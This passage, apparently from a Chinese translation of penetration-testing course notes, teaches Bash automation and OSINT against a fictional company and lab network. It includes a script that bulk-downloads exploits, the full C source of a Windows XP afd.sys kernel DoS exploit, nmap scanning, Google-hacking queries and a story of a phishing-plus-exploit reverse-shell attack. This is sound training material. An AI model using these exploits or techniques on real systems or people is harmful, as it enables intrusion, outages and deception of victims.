[megacorpone.com](http://megacorpone.com) 的首页链接的域名列表。接下来，我们将使用 host 来发现我们文本文件中每个域名的对应 IP 地址。我们可以用一个 Bash 单行循环来完成这个任务。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# for url in $(cat list.txt); do host $url; done\nadmin.megacorpone.com has address 51.222.169.208\nbeta.megacorpone.com has address 51.222.169.209\nintranet.megacorpone.com has address 51.222.169.211\nmail2.megacorpone.com has address 51.222.169.213\nmail.megacorpone.com has address 51.222.169.212\nsiem.megacorpone.com has address 51.222.169.215\nsupport.megacorpone.com has address 51.222.169.218\nsyslog.megacorpone.com has address 51.222.169.217\ntest.megacorpone.com has address 51.222.169.219\nvpn.megacorpone.com has address 51.222.169.220\nwww2.megacorpone.com has address 149.56.244.87\nwww.megacorpone.com has address 149.56.244.87\n```\n\nhost 命令给了我们各种各样的输出，但并非所有的输出都是相关的。我们将通过管道符将输出结果输入“有地址”的 grep 来提取 IP 地址，然后对结果进行 cut 和 sort。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# for url in $(cat list.txt); do host $url; done | grep \"has address\" | cut -d \" \" -f 4 | sort -u\n149.56.244.87\n51.222.169.208\n51.222.169.209\n51.222.169.211\n51.222.169.212\n51.222.169.213\n51.222.169.215\n51.222.169.217\n51.222.169.218\n51.222.169.219\n51.222.169.220\n```\n\n很好，我们已经从网页中提取了 “.megacorpone.com” 子域，并获得了相应的 IP 地址。正如我们所看到的，我们可以用 Bash 和相关的工具以及正则表达式来处理数据，这加强了一个事实：任何花在深入研究这些主题上的时间都会在未来节省大量的处理数据或加速进程的时间。\n\n### Bash 的实际使用 —— 例子 2\n\n在这个例子中，让我们假设我们正在进行渗透测试，并且拥有对一台 Windows 机器的非特权访问权。当我们继续收集信息时，我们意识到这台机器可能会被一个我们读到的以字母 a、f 和 d 开头的漏洞所攻击，但我们不记得这个漏洞的全名。为了提升我们的权限，我们想搜索那个特定的漏洞。\n\n要做到这一点，我们将需要在 [https://exploit-db.com](https://exploit-db.com，)，搜索 “afd windwos” 下载符合我们搜索条件的漏洞，并检查它们，直到我们找到合适的漏洞。我们可以通过网站手动完成，这不会花太多时间，但如果我们花时间写一个 Bash 脚本，我们很容易地用它来搜索并在以后自动下载漏洞。\n\n利用我们现在对脚本的了解，让我们试着将这项任务自动化。\n\n我们将从 Kali Linux 上的 Searchsploit 工具开始。Searchsploit 是 Exploit-DB 的一个命令行搜索工具，它允许我们无论走到哪里都能带着 Exploit 数据库的离线拷贝。我们将传递 “afd windows” 作为搜索字符串，使用 `-w` 来返回 https://www.exploit-db.com，而不是本地路径，以及 `-t` 来搜索漏洞标题。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit afd windows -w -t\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------\n Exploit Title                                                                                                                                                         |  URL\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------\nMicrosoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)                                                                                              | <https://www.exploit-db.com/exploits/40564>\nMicrosoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                                                                                                            | <https://www.exploit-db.com/exploits/18755>\nMicrosoft Windows - 'AfdJoinLeaf' Local Privilege Escalation (MS11-080) (Metasploit)                                                                                   | <https://www.exploit-db.com/exploits/21844>\nMicrosoft Windows 7 (x64) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040)                                                                                 | <https://www.exploit-db.com/exploits/39525>\nMicrosoft Windows 7 (x86) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040)                                                                                 | <https://www.exploit-db.com/exploits/39446>\nMicrosoft Windows 7 Kernel - Pool-Based Out-of-Bounds Reads Due to bind() Implementation Bugs in afd.sys / tcpip.sys                                                   | <https://www.exploit-db.com/exploits/42009>\nMicrosoft Windows XP - 'afd.sys' Local Kernel Denial of Service                                                                                                        | <https://www.exploit-db.com/exploits/17133>\nMicrosoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (K-plugin) (MS08-066)                                                                                 | <https://www.exploit-db.com/exploits/6757>\nMicrosoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080)                                                                                            | <https://www.exploit-db.com/exploits/18176>\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------\nShellcodes: No Results\n```\n\n这是一个好的开始，但我们需要对结果进行修饰。现在，我们只对该漏洞的 URL 感兴趣，所以让我们搜索 “http”，然后剪切我们需要的内容。我们将使用一个 “|” 字符分隔符，并提取第二个字段。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit afd windows -w -t|grep http|cut -f 2 -d \"|\"\n <https://www.exploit-db.com/exploits/40564>\n <https://www.exploit-db.com/exploits/18755>\n <https://www.exploit-db.com/exploits/21844>\n <https://www.exploit-db.com/exploits/39525>\n <https://www.exploit-db.com/exploits/39446>\n <https://www.exploit-db.com/exploits/42009>\n <https://www.exploit-db.com/exploits/17133>\n <https://www.exploit-db.com/exploits/6757>\n <https://www.exploit-db.com/exploits/18176>\n```\n\n这看起来好一点。我们现在有了每个漏洞的 URL，我们可以使用 Bash 循环来下载并保存在本地。然而，在我们这样做之前，我们注意到每个页面都有一个下载“原始”漏洞代码的链接，这才是我们真正想要的东西。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e846046b-1782-4e71-8114-f2bbf84b426b/Untitled.png)\n\n我们看到，每个原始页面（如 /exploits/40564）都链接到一个原始漏洞（如 /raw/40564）。有了这些信息，我们运行 sed (sed ‘s/exploits/raw/’) 来修改下载 URL，并将其插入 Bash 单行程序，以下载漏洞的原始代码。\n\n```bash\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d \"|\"); do exp_name=$(echo $e | cut -d \"/\" -f 5) && url=$(echo $e | sed 's/exploits/raw/') && wget -q --no-check-certificate $url -O $exp_name; done\n```\n\n请注意，我们使用了一个 for 循环来迭代我们抓取的 Searchsploit URL。在这个循环中，我们将 exp_name 设置为漏洞的“名称”（使用 grep、cut 和命令替换），将 url 设置为原始下载位置（同样使用 sed 和命令替换）。如果成功了（&&），我们使用 wget 抓取漏洞（在安静模式下，没有证书检查），将其保存在本地，漏洞名称为本地文件名。\n\n一旦我们运行它，我们就等待命令提示，并验证漏洞确实被下载了，使用文件来验证文件时文本。\n\n```bash\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# ls -l           \n总用量 120\n-rw-r--r-- 1 root root  1363  3月 30 04:01 17133\n-rw-r--r-- 1 root root 12215  3月 30 04:01 18176\n-rw-r--r-- 1 root root  9698  3月 30 04:00 18755\n-rw-r--r-- 1 root root 11590  3月 30 04:00 21844\n-rw-r--r-- 1 root root 10575  3月 30 04:00 39446\n-rw-r--r-- 1 root root 14193  3月 30 04:00 39525\n-rw-r--r-- 1 root root 32674  3月 30 04:00 40564\n-rw-r--r-- 1 root root 12636  3月 30 04:00 42009\n-rw-r--r-- 1 root root   612  3月 30 04:01 6757\n\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# file 17133                     \n17133: C source, ASCII text, with CRLF line terminators\n```\n\n我们可以检查每个漏洞，并看到我们确实抓住了原始漏洞：\n\n```bash\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# cat 17133\n////////////////////////////////////////////////////////////////////////////\n//\n// Title: Microsoft Windows xp AFD.sys Local Kernel DoS Exploit\n// Author: Lufeng Li of Neusoft Corporation\n// Vendor: www.microsoft.com\n// Vulnerable: Windows xp sp3\n//\n/////////////////////////////////////////////////////////////////////////////\n\n#include <stdio.h>\n#include <Winsock2.h>\n\n#pragma comment (lib, \"ws2_32.lib\")\n\nBYTE buf[]={\n0xac,0xfd,0xd3,0x00,0x01,0x00,0x00,0x00,0x00,0x00,\n0x00,0x00,0x20,0x00,0x00,0x00,0xe8,0xfd,0xd3,0x00,\n0xb8,0xfd,0xd3,0x00,0xf8,0xfd,0xd3,0x00,0xc4,0xfd,\n0xd3,0x00,0xcc,0xfd,0xd3,0x00};\n\nint main( )\n{\n    WSADATA ws;\n\n    SOCKET tcp_socket;\n    struct sockaddr_in peer;\n        ULONG  dwReturnSize;\n\n        printf(\"\\\\n Microsoft Windows xp AFD.sys Local Kernel DoS Exploit \\\\n\\\\n\");\n        printf(\"\\\\t Create by Lufeng Li of Neusoft Corporation. \\\\n\\\\n\");\n\n    WSAStartup(0x0202,&ws);\n\n    peer.sin_family = AF_INET;\n    peer.sin_port = htons( 0x01bd );\n    peer.sin_addr.s_addr = inet_addr( \"127.0.0.1\" );\n\n    tcp_socket = socket(AF_INET, SOCK_DGRAM, 0);//SOCK_DGRAM\n\n        if ( connect(tcp_socket, (struct sockaddr*) &peer, sizeof(struct sockaddr_in)) )\n    {\n                printf(\"connect error\\\\n\");\n        exit(0);\n    }\n\n        DeviceIoControl( (HANDLE)tcp_socket,0x000120cf, buf,0x24,buf,0x24,&dwReturnSize, NULL);\n\n    return TRUE;\n}\n```\n\n尽管我们用 Bash 单行程序取得了成功，但我们的代码并不是很干净，而且也不是特别容易重复使用。让我们把所有东西放在一个 Bash 脚本中来解决这些问题。\n\n```bash\nkali@kali:~$ cat dlsploits.sh\n#!/bin/bash\n# Bash script to search for a given exploit and download all matches.\n\nfor e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d \"|\")\n\ndo\n exp_name=$(echo $e | cut -d \"/\" -f 5)\n url=$(echo $e | sed 's/exploits/raw/')\n wget -q --no-check-certificate $url -O $exp_name\ndone\n\nkali@kali:~$ chmod +x ./dlsploits.sh\n\nkali@kali:~$ ./dlsploits.sh\n```\n\n我们现在可以手动检查漏洞，找到我们感兴趣的漏洞，在测试机器上试一试，最后在目标上运行适当的漏洞，因为在活的目标上随机利用漏洞是不好的形式，是完全灾难的秘诀。\n\n### Bash 的实际使用 —— 例子 3\n\n作为渗透测试人员，我们一直在努力寻找效率，以减少我们分析数据的时间，特别是在各种扫描中恢复的数据量。\n\n让我们假设我们的任务是扫描一个 C 类子网，以识别网络服务器并确定它们是否呈现出有趣的攻击面。端口扫描是检查远程机器上的 TCP 或 UDP 端口的过程，目的是检查目标机器上有哪些服务器在运行，可能存在哪些攻击载体。我们将在另一个模块中更详细地讨论端口扫描，但现在，让我们保持一般性，因为这是一个很好的例子，说明 Bash 脚本可以自动完成一项相当乏味的任务。\n\n为了实现我们的目标，我们首先会对整个子网进行端口扫描，以确定潜在的开放网络服务，然后我们可以手动浏览它们的网页。\n\n首先，让我们创建一个临时文件夹，用于这个练习。\n\n```bash\nkali@kali:~$ mkdir temp\n\nkali@kali:~$ cd temp/\n```\n\n现在我们已经创建了这个目录，并且用 cd 进入了这个目录，让我们进入更有趣的部分，对 C 类子网进行扫描。我们将只关注 80 端口，以保持一定的可管理性，我们将使用 nmap（我们在后面的模块中讨论）作为我们的端口扫描工具。\n\n```bash\nkali@kali:~/temp$ sudo nmap -A -p80 --open 10.11.1.0/24 -oG nmap-scan_10.11.1.1-254\nStarting Nmap 7.60 ( <https://nmap.org> ) at 2019-03-18 18:57 EDT\nNmap scan report for 10.11.1.8\nHost is up (0.030s latency).2\n\nPORT STATE SERVICE VERSION\n80/tcp open http Apache httpd 2.0.52 ((CentOS))\n| http-methods:\n|_ Potentially risky methods: TRACE\n| http-robots.txt: 2 disallowed entries\n|_/internal/ /tmp/\n|_http-server-header: Apache/2.0.52 (CentOS)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nMAC Address: 00:50:56:89:20:34 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open an\nDevice type: general purpose|WAP|firewall|proxy server|PBX\nRunning (JUST GUESSING): Linux 2.6.X (92%), ZoneAlarm embedded (90%), Cisco embedded\nAggressive OS guesses: Linux 2.6.18 (92%), Linux 2.6.9 (92%), Linux 2.6.9 - 2.6.27 (90\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT ADDRESS\n1 30.19 ms 10.11.1.8\n\nNmap scan report for 10.11.1.10\nHost is up (0.030s latency).\n\nPORT STATE SERVICE VERSION\n80/tcp open http Microsoft IIS httpd 6.0\n| http-methods:\n|_ Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\nMAC Address: 00:50:56:89:06:D0 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open an\nDevice type: general purpose|WAP\nRunning (JUST GUESSING): Microsoft Windows 2003|XP|2000 (89%), Apple embedded (86%)\nOS CPE: cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE\nHOP RTT ADDRESS\n1 30.41 ms 10.11.1.10\n...\n```\n\n这是一个非常直接的扫描， `-A` 表示积极的扫描， `-p` 指定端口或端口范围， `-open` 只返回有开放端口的机器， `-oG` 以 greppable 格式保存扫描结果。再说一遍，如果 nmap 对你来说是陌生的，不要着急。我们将在后面讨论细节，但 nmap 肯定提供了相当数量的输出来工作。\n\n让我们 cat 输出文件来熟悉它的格式。\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254\n# Nmap 7.60 scan initiated Sun Mar 18 18:57:48 2019 as: nmap -A -p80 --open -oG nmapscan_10.11.1.1-254 10.11.1.0/24\nHost: 10.11.1.8 () Status: Up\nHost: 10.11.1.8 () Ports: 80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq\nIndex: 197 IP ID Seq: All zeros\nHost: 10.11.1.10 () Status: Up\nHost: 10.11.1.10 () Ports: 80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq Index: 256\nIP ID Seq: Incremental\nHost: 10.11.1.13 () Status: Up\nHost: 10.11.1.13 () Ports: 80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq Index: 136\nIP ID Seq: Incremental\n...\n```\n\n有趣的是，每个 IP 地址重复了两次，第一行显示机器状态，第二行显示被扫描的端口号。由于我们只对唯一的 IP 地址感兴趣，所以有必要进行一些清理。让我们多包含端口 80 的行进行 grep。\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80\n# Nmap 7.60 scan initiated Sun Mar 18 18:57:48 2019 as: nmap -A -p80 --open -oG nmapscan_10.11.1.1-254 10.11.1.0/24\nHost: 10.11.1.8 () Ports: 80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq\nIndex: 197 IP ID Seq: All zeros\nHost: 10.11.1.10 () Ports: 80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq Index: 256\nIP ID Seq: Incremental\nHost: 10.11.1.13 () Ports: 80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq Index: 136\nIP ID Seq: Incremental\n...\n```\n\n这是一个很好的开始，但注意到第一行是不相关的。为了排除它，我们将用 `-v` 再次 grep，这是一个 “反向 grep”，只显示不匹配搜索字符串的行。在这个例子中，我们不想要任何包含大小写关键词 “Nmap” 的行。\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v \"Nmap\"\nHost: 10.11.1.8 () Ports: 80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq\nIndex: 197 IP ID Seq: All zeros\nHost: 10.11.1.10 () Ports: 80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq Index: 256\nIP ID Seq: Incremental\nHost: 10.11.1.13 () Ports: 80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq Index: 136\nIP ID Seq: Incremental\n...\n```\n\n我们的输出看起来好多了。让我们试着只提取 IP 地址，因为这就是我们真正感兴趣的东西。为此，我们将使用 awk 来打印第二个字段，用 `Space` 作为分隔符。\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v \"Nmap\" | awk '{print\n$2}'\n10.11.1.8\n10.11.1.10\n10.11.1.13\n10.11.1.14\n10.11.1.22\n10.11.1.24\n10.11.1.31\n10.11.1.39\n10.11.1.49\n10.11.1.50\n10.11.1.71\n...\n```\n\n很好。这看起来是一个干净的 IP 地址列表。下一步，我们将使用 Bash 单行程序来循环浏览上面的 IP 列表，并运行 `cutycapt`，这是一个 Qt WebKit 网页渲染捕捉工具。我们将使用 `-url` 来指定目标网站，使用 `-out` 来指定输出文件的名称。\n\n```bash\nkali@kali:~/temp$ for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v \"Nmap\" | awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done\n```\n\n一旦我们的循环结束并有了提示，我们就可以用 ls 的 `-l` 选项检查由我们的 Bash 单行程序创建的输出文件的列表，它每行列出一个文件，抑制了其他细节。\n\n```bash\nkali@kali:~/temp$ ls -1 *.png\n10.11.1.10.png\n10.11.1.115.png\n10.11.1.116.png\n10.11.1.128.png\n10.11.1.13.png\n10.11.1.133.png\n10.11.1.14.png\n10.11.1.202.png\n10.11.1.209.png\n10.11.1.217.png\n...\n```\n\n完美。我们正越来越接近我们的目标，我们可以单独检查这些文件，但更有吸引力的选择是再次将我们的脚本只是用于工作，看看是否还有其他可以自动化的东西。这不仅需要 Bash 脚本技能，还需要基本的 HTML 知识。\n\n```bash\nkali@kali:~/temp$ cat ./pngtohtml.sh\n#!/bin/bash\n# Bash script to examine the scan results through HTML.\n\necho \"<HTML><BODY><BR>\" > web.html\n\nls -1 *.png | awk -F : '{ print $1\":\\\\n<BR><IMG SRC=\\\\\"\"$1\"\"$2\"\\\\\" width=600><BR>\"}' >>\nweb.html\n\necho \"</BODY></HTML>\" >> web.html\n\nkali@kali:~/temp$ chmod +x ./pngtohtml.sh\n\nkali@kali:~/temp$ ./pngtohtml.sh\n\nkali@kali:~/temp$ firefox web.html\n```\n\n这脚本建立了一个 HTML 文件（web.html），从最基本的标签开始。然后，ls 和 awk 语句将每个  `.PNG` 文件名插入一个 HTML IMG 标签，将其追加到我们的 web.html 文件。最后，我们将 HTML 结束标签附加到文本中，使脚本可执行，并在浏览器中查看。结果很简单，但很有效，让我们看到了每个网络服务器的主页面。\n\n希望这些简短的实际例子能让你了解到 Bash 脚本所能提供的一些可能性。当试图在评估过程中快速实现大量任务的自动化时，学会有效使用 Bash 将是至关重要的。\n\n### 练习\n\n1. 研究 Bash 循环并编写一个简短的脚本，对你的目标 IP 范围 10.11.1.0/24 进行 ping 扫频。\n2. 尝试用更高级的脚本语言，如 Python、Prel 或 Ruby，来完成上述练习。\n3. 使用本模块中的实际例子来帮助你创建一个 Bash 脚本，从 access_log.txt 文件中提取 JavaScript 文件（http://www.offensive-security.com/pwkfiles/access_log.txt.gz）。确保文件名不包括路径，并且是排序的。\n4. 用另一种语言，如Python、Prel 或 Ruby，重新编写前面的练习。\n\n# 被动的信息收集\n\n被动信息收集（也称开源情报或 OSINT）是收集有关目标的公开信息的过程通常不与该目标有任何直接互动。\n\n我们可以利用各种资源和工具来收集这些信息，这个过程是循环的而不是线性的。换句话说，这个过程的任何阶段的“下一步”都取决于我们在以前的步骤中所发现的东西，从而形成过程的“循环”。由于每个工具或资源可以产生任何数量的不同结果，因此很难定义一个标准化的过程。被动信息收集的最终目标是获得澄清或扩大攻击面的信息，帮助我们成功的网络钓鱼活动，或补充其他渗透测试步骤，如密码猜测。\n\n由于这一过程的循环性质，本模块的展开方式将与之前的模块不同。我们将简单地介绍各种资源和工具，解释它们是如何工作的，并用建立一个被动的信息收集活动所需的基本技术来武装你，而不是提出有联系的场景。\n\n在开始之前，我们需要定义被动信息收集。关于在这种情况下什么是“被动”，有两个不同的流派。\n\n在最严格的解释中，我们从不与目标直接沟通。例如，我们可以依靠第三方获取信息，但我们不会访问目标的任何系统或服务器。\n\n使用这种方式可以对我们的行动和意图保持高度的保密性，但也可能是麻烦的，并可能限制我们的结果。\n\n在一个较宽松的解释中，我们可能与目标进行互动，但只是像一个正常的互联网用户那样。例如，如果目标网站允许我们注册一个账户，我们可以这样做。然而，在这个阶段，我们不会测试网站的漏洞。\n\n在本模块中，我们将对我们的方法采用后一种不太严格的解释。这两种方法都不一定“正确”。在决定使用哪种方法之前，我们需要考虑渗透测试的范围与参与规则。此外，请记住这个阶段可能并不总是必要的，即使这个阶段取得了成果（例如以成功的鱼叉网络钓鱼活动的形势），其他阶段可能需要同等或更大的关注。\n\n在我们开始讨论资源和工具之前，让我们分享一个渗透测试的个人例子，其中涉及被动信息收集活动的成功要素。\n\n**作者的说明**\n\n几年前，我们 Offensive Security 公司的任务是为一家小公司进行渗透测试。这家公司几乎没有互联网的存在，只有很少的外部暴露服务，所有这些都被证明是安全的。实际上，没有任何攻击面可言。经过集中的被动信息收集活动，利用各种谷歌搜索运营商，连接到其他在线工具的信息“管道”，以及一点创造性的逻辑思维，我们发现目标公司的一名员工在一个集邮论坛上发了一个帖子。\n\n```bash\nHi!\nI'm looking for rare stamps form the 1950's - for sale or trade.\nPlease contact me at david@company-address.com\nCell: 999-999-9999\n\n你好！\n我正在寻找 20 世纪 50 年代的稀有邮票 —— 用于出售或交易。\n请与我联系 david@company-address.com\n手机：999-999-9999\n```\n\n我们利用这些信息发起了一个半复杂的客户端攻击。我们迅速注册了一个与邮票有关的域名，并设计了一个登录页面，显示我们用谷歌图片找到的 50 年代的各种稀有邮票。这个域名和网站的设计无疑增加了我们的邮票交易网站的可感知的可靠性。\n\n接下来，我们在网站的网页上嵌入了一些讨厌的客户端攻击利用代码，并在工作日给 “大卫” 打电话。在电话中，我们假扮成一个继承了他们祖父的巨大邮票收藏的集邮者。\n\n大卫接到我们的电话后喜出望外，毫不犹豫地访问了这个恶意网站，查看“邮票收藏”。在浏览该网站时，漏洞代码在他的本地机器上执行，并向我们发送了一个反向 Shell。\n\n这是一个很好的例子，说明一些无害的被动信息收集的信息，如一个员工用他的公司邮箱从事个人业务，可以在渗透测试中导致一个立足点。有时，最小的细节可能是最重要的。\n\n<aside> 💡 虽然“大卫”没有遵循最佳实践，但正是该公司的政策和缺乏安全意识计划为这一漏洞创造了条件。正因为如此，我们避免在书面报告中把责任推给某个人。作为渗透测试人员，我们的目标是提高客户资源的安全性，而不是针对某一个员工。简单地删除“大卫”不会解决这个问题。\n\n</aside>\n\n让我们来看看一些最流行的工具和技术，它们可以帮助我们进行成功的信息收集活动。我们将使用MegaCorp One，一个由 Offensive Security 创建的虚构公司，作为我们活动的主题。\n\n## 记笔记\n\n一个信息收集活动可以产生大量的数据，我们必须很好地管理这些数据，这样我们就可以在进步的搜索中利用这些数据，或者在以后的阶段使用这些数据。做笔记的方法没有对错之分。然而，我们可能会发现，如果我们保持详细的、格式良好的笔记，以后检索信息会更容易。\n\n## 网站侦查\n\n如果客户有一个网站，我们可以通过简单的浏览网站来收集基本信息。小型组织可能只有一个网站，而大型组织可能有很多，包括一些没有维护的网站。让我们看看 MegaCorp One 的网站（https://www.megacorpone.com/），以了解更多关于我们的目标。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/83621e12-5d8e-40d4-9f1f-8e0519044d1e/Untitled.png)\n\n对其网站的快速审查显示，他们是一家纳米技术公司。\n\n在 https://www.megacorpone.com/about.html，关于页面显示了他们一些员工的电子邮件地址和 Twitter 账户。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/979b7304-c407-4e77-b20b-3168c39e311b/Untitled.png)\n\n我们可以在社会媒体的信息收集活动中使用这些地址。我们将在后面的章节中详细讨论这个问题。\n\n还值得一提的是，该公司的电子邮件地址格式遵循“首字母+姓氏”的模式。然而，他们的 CEO 的电子邮件仅仅使用了他的名字。这表明创始人或长期员工的电子邮件格式与新员工的不同。这一信息在以后的评估阶段可能会很有用。\n\n在同一页上发现的企业社交媒体账户，也值得记录，以便进一步研究。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1dce2389-4def-497c-91fd-870252c1ee6b/Untitled.png)\n\n让我们更新我们的笔记，以记录这些信息的每一点，包括电子邮件地址格式和社交媒体网站的参考。\n\n## Whois 枚举\n\nWhois 是一种 TCP 服务、工具和一种数据库，可以提供关于域名的信息，如名称服务器和注册商。这些信息通常是公开的，因为注册商对私人注册收取费用。\n\n我们可以通过将域名 [megacorpone.com](http://megacorpone.com/) 传入 whois 客户端，执行标准的前向搜索，来收集域名的基本信息。\n\n```bash\nkali@kali:~$ whois megacorpone.com\n Domain Name: MEGACORPONE.COM\n Registry Domain ID: 1775445745_DOMAIN_COM-VRSN\n Registrar WHOIS Server: whois.gandi.net\n Registrar URL: <http://www.gandi.net>\n Updated Date: 2019-01-01T09:45:03Z\n Creation Date: 2013-01-22T23:01:00Z\n Registry Expiry Date: 2023-01-22T23:01:00Z\n...\nRegistry Registrant ID:\nRegistrant Name: Alan Grofield\nRegistrant Organization: MegaCorpOne\nRegistrant Street: 2 Old Mill St\nRegistrant City: Rachel\nRegistrant State/Province: Nevada\nRegistrant Postal Code: 89001\nRegistrant Country: US\nRegistrant Phone: +1.9038836342\n...\nRegistry Admin ID:\nAdmin Name: Alan Grofield\nAdmin Organization: MegaCorpOne\nAdmin Street: 2 Old Mill St\nAdmin City: Rachel\nAdmin State/Province: Nevada\nAdmin Postal Code: 89001\nAdmin Country: US\nAdmin Phone: +1.9038836342\n...\nRegistry Tech ID:\nTech Name: Alan Grofield\nTech Organization: MegaCorpOne\nTech Street: 2 Old Mill St\nTech City: Rachel\nTech State/Province: Nevada\nTech Postal Code: 89001\nTech Country: US\nTech Phone: +1.9038836342\n...\nName Server: NS1.MEGACORPONE.COM\nName Server: NS2.MEGACORPONE.COM\nName Server: NS3.MEGACORPONE.COM\n...\n```\n\n并非所有这些数据都是有用的，但我们确实发现了一些有价值的信息。首先，输出结果显示，Alan Grofield 注册了这个域名。根据 Megacorp One 的联系页面，Alan 是 “IT 和安全总监”。\n\n我们还发现了 Megacorp One 的名称服务器。名称服务器是 DNS 的一个组成部分，我们在此不做研究，但我们应该把这些服务器添加到我们的笔记中。\n\n除了这种标准的前向查找（收集有关 DNS 名称的信息）外，whois 客户端还可以进行反向查找。假设我们有一个 IP 地址，我们可以进行反向查询，以收集更多关于它的信息。\n\n```bash\nkali@kali:~$ whois 38.100.193.70\n...\nNetRange: 38.0.0.0 - 38.255.255.255\nCIDR: 38.0.0.0/8\nNetName: COGENT-A\n...\nOrgName: PSINet, Inc.\nOrgId: PSI\nAddress: 2450 N Street NW\nCity: Washington\nStateProv: DC\nPostalCode: 20037\nCountry: US\nRegDate:\nUpdated: 2015-06-04\n...\n```\n\n反向查询的结果为我们提供了关于谁在托管该 IP 地址的信息。这些信息以后可能会很有用，就像我们收集的所有信息一样，我们将把这些信息添加到我们的笔记中。\n\n## Google Hacking\n\n“Google Hacking” 一词是由 Johnny Long 在 2001 年推广的。通过几次讲座和一本非常受欢迎的书（Google Hacking For Penetration Testers），他概述了如何利用 Google 这样的搜索引擎来发现关键信息、漏洞和配置错误的网站。\n\n这种技术的核心是巧妙的搜索字符串和运算符，允许创造性地完善搜索查询，其中大部分都适用于各种搜索引擎。这个过程是反复进行的，从广泛的搜索开始，用运算符缩小范围，以筛选出不相关或不感兴趣的结果。\n\n让我们尝试一下这些操作符，感受一下它们是如何工作的。\n\n网站操作符将搜索限制在一个单一的域。我们可以用这个运算符来粗略了解一个组织的网络存在。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/497bebc0-235b-4ce4-8a04-1367e1cba9bc/Untitled.png)\n\n然后我们可以使用进一步的运算符来缩小这些结果。例如，filetype（或 ext）操作符将搜索结果限制在指定的文件类型。\n\n在这个例子中，我们结合运算符来定位 [www.megacorpone.com](http://www.megacorpone.com/)（site:megacorpone.com）上的 PHP 文件（filetype:php）。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/78777c56-8056-4aba-b004-d607fec2acc6/Untitled.png)\n\n我们只得到一个结果，但这是一个有趣的结果。我们的查询找到了 AlivenVault OSSIM 实例的登录页面，这是一个安全信息和事件管理（SIEM）平台。安全团队使用 SIEM 工具来监控应用程序和网络流量的恶意活动。通常，这些工具只在内部网络上可用。我们应该注意这个 URL，因为如果我们能在主动开发阶段找到用户凭证来登录，它可能会被证明是有用的。\n\next 操作符也可以帮助辨别网站上可能使用的编程语言。像 ext:jsp、ext:cfm、ext:pl 这样的搜索将分别找到索引的 Java Server Pages、Coldfusion 和 Perl 网页。\n\n我们还可以用 `-` 来修改一个操作符，以便从搜索中排除特定的项目，缩小搜索结果的范围。\n\n例如，为了找到有趣的、非 HTML 的页面，我们可以使用 site:megacorpone.com 来限制搜索到 [megacorpone.com](http://megacorpone.com) 和子域，接着使用 -filetype:html 来从结果中排除 HTML 页面。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d380a2a-fc4c-4eea-a2fb-c6331d18a3c6/Untitled.png)\n\n在这种情况下，我们发现了几个有趣的页面，包括一个管理控制台。\n\n在另一个例子中，我们可以使用 intitle:”index of”“parent directory” 的搜索来找到标题中含有 “index of” 的页面，以及页面中含有 “parent directory” 